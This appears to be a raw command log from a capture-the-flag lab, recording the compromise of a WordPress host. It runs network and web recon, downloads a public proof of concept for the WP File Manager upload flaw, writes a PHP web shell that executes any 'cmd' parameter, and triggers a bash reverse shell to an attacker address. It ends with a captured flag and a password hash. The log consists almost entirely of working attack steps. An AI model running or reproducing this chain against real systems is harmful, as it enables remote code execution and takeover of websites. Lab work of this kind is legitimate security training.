arp-scan -I ens33 --localnet
ping -c 1 192.168.153.153
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.153.153 -oG allports
sudo nmap -sCV -p22,80 192.168.153.153 -oN targeted
whatweb 192.168.153.153
gobuster dir -u http://192.168.153.153/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x http,php,txt
Ctrl+u
sudo nano /etc/hosts
wpscan --url http://192.168.153.153/blog --enumerate u,vp --plugins-detection aggressive

 wget https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py      
nano payload.php

 
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
python3 2020-wp-file-manager-v67.py http://192.168.153.153/blog/            


http://192.168.153.153/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php

http://192.168.153.153/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=ip%20a

http://192.168.153.153/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.153.152/443%200%3E%261%22

horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}


$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc.
